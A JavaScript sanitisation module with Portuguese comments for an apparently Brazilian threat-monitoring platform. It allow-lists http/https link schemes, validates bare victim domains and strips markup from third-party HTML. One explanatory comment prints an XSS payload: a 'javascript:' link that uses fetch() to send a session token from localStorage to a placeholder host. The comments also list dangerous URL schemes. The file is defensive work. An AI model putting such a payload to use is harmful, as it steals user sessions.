// -----------------------------------------------------------------------------
// SANEAMENTO DE CONTEÚDO DE TERCEIRO
//
// Tudo o que este projeto coleta vem de fora: feed RSS de cinquenta veículos,
// perfis do ransomware.live, agregadores. Nada disso está sob nosso controle,
// e a única postura defensável é tratar todo campo como hostil até ser limpo.
//
// A limpeza acontece AQUI, NO SERVIDOR, UMA VEZ, NA GRAVAÇÃO — não no
// componente que exibe. São três razões, e a terceira é a que decide:
//
//   1. o custo é pago uma vez por item coletado, não a cada renderização;
//   2. o banco passa a conter dado já confiável, então qualquer consumidor
//      futuro da API herda a proteção sem precisar saber dela;
//   3. esquecer a limpeza em UM componente novo é inevitável com o tempo.
//      Esquecer no coletor é impossível: só existe um caminho de escrita.
// -----------------------------------------------------------------------------

/**
 * Esquemas que um link de notícia pode ter.
 *
 * Lista FECHADA, e é isso que a torna útil. Uma lista de proibidos
 * ("javascript:", "data:", "vbscript:") erra por omissão a cada esquema novo
 * que alguém inventa, e erra silenciosamente.
 */
const ESQUEMAS_PERMITIDOS = new Set(['http:', 'https:'])

/**
 * URL de terceiro pronta para virar `href`, ou `null`.
 *
 * O PROBLEMA CONCRETO. O parser lê `<link>` do feed e grava o valor como veio.
 * O front põe esse valor em `href={n.url}` — em NewsCard, no dossiê de país,
 * nos eventos consolidados, na lista de vítimas. Um feed comprometido, ou
 * apenas malicioso, que publicasse
 *
 *     <link>javascript:fetch('https://...?t='+localStorage.getItem('defesabr-auth-v5'))</link>
 *
 * teria produzido um link que, clicado, roda script na origem da plataforma —
 * e o que está no `localStorage` dessa origem é o token de sessão. O React
 * avisa no console sobre `javascript:` em href, mas ainda renderiza: o aviso
 * aparece para quem desenvolve, não para quem clica.
 *
 * Não é ameaça teórica só porque as fontes de hoje são gov.br e imprensa
 * grande. `guid`, `link` e `description` são campos que o publicador escreve;
 * a plataforma agrega cinquenta deles e um agregador que reemite terceiros.
 *
 * O que esta função faz, em ordem: recusa o que não é texto, resolve a URL
 * (relativa é resolvida contra a base da fonte, quando informada), e só
 * devolve o que terminou em http ou https. Qualquer outra coisa vira `null`,
 * e `null` é um estado que a interface já sabe tratar — o cartão sem link
 * exibe o título sem virar âncora.
 *
 * @param {*} bruto  o valor como veio da fonte
 * @param {string} [base]  URL do site da fonte, para resolver link relativo
 * @returns {string|null}
 */
export function urlSegura(bruto, base) {
  const texto = String(bruto || '').trim()
  if (!texto) return null

  try {
    // `new URL` normaliza e é quem sabe separar esquema de caminho de verdade.
    // Um teste por expressão regular erraria em "JaVaScRiPt:", em espaço à
    // esquerda e nos vários encaixes que o navegador aceita e o regex não.
    const u = base ? new URL(texto, base) : new URL(texto)
    if (!ESQUEMAS_PERMITIDOS.has(u.protocol)) return null
    // 2.000 caracteres cobrem com folga qualquer URL de notícia real e barram
    // a URL gigante que só serve para inflar linha de banco.
    return u.href.length <= 2000 ? u.href : null
  } catch {
    // Sem base, um link relativo cai aqui. É o comportamento certo: um href
    // relativo apontaria para dentro da própria plataforma, o que é errado
    // para um link que deveria levar ao veículo de origem.
    return null
  }
}

/**
 * Domínio de terceiro, ou `null`.
 *
 * NÃO É O MESMO QUE `urlSegura`, e confundir os dois custou uma regressão
 * nesta mesma auditoria. O ransomware.live entrega o campo `website` como
 * domínio nu — "ialegre.com", "arcos.mg.gov.br" —, não como endereço. Passá-lo
 * por `urlSegura` devolvia `null` para os 624 registros que o banco tem, e o
 * campo some justamente da lista de vítimas do Estado brasileiro, que é o
 * recorte que este produto existe para mostrar.
 *
 * Um domínio nu também não pode virar `href` cru: `<a href="ialegre.com">` é
 * link RELATIVO, e clicar nele navega para dentro da própria plataforma. Por
 * isso a função devolve o domínio como TEXTO — quem quiser fazer link
 * antepõe o esquema explicitamente, de propósito.
 *
 * Recusa o que não parece domínio: espaço, marcação, esquema embutido. Um
 * `javascript:` que chegasse por aqui não passaria por engano.
 */
export function dominioSeguro(bruto) {
  const texto = String(bruto || '').trim().toLowerCase()
  if (!texto || texto === 'null' || texto === 'undefined') return null
  if (texto.length > 253) return null
  // Rótulos separados por ponto, com hífen permitido no meio. Nada mais.
  return /^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)+$/.test(texto)
    ? texto
    : null
}

/**
 * Texto limpo a partir de HTML de terceiro.
 *
 * Estava em `collectors/atores.js`, onde nasceu para a descrição do ator. Ao
 * subir para cá vale para qualquer campo de texto vindo de fora — e, mais
 * importante, deixa de haver o risco de aparecer uma segunda implementação
 * ligeiramente diferente no próximo coletor.
 *
 * Há duas formas erradas de tratar marcação de terceiro e uma certa:
 *
 *   ERRADO 1  renderizar como HTML no navegador. É conteúdo de uma API
 *             externa sobre a qual não temos controle nenhum; um `<script>`
 *             ali vira XSS na nossa tela.
 *   ERRADO 2  exibir como texto puro. O leitor vê "<br>" literal no meio da
 *             frase, que foi o que aconteceu antes desta função existir.
 *   CERTO     converter a marcação em quebra de linha e REMOVER o resto,
 *             aqui no servidor, uma vez, na gravação. O que chega ao
 *             navegador já é texto.
 */
export function textoLimpo(html) {
  return String(html || '')
    .replace(/<\s*br\s*\/?\s*>/gi, '\n')
    .replace(/<\s*\/?\s*(p|div|li)\s*[^>]*>/gi, '\n')
    .replace(/<[^>]*>/g, '')
    .replace(/&nbsp;/gi, ' ')
    .replace(/&amp;/gi, '&')
    .replace(/&lt;/gi, '<')
    .replace(/&gt;/gi, '>')
    .replace(/&quot;/gi, '"')
    .replace(/&#39;/gi, "'")
    .replace(/\n{3,}/g, '\n\n')
    .replace(/[ \t]{2,}/g, ' ')
    .trim()
}

export default { urlSegura, dominioSeguro, textoLimpo }
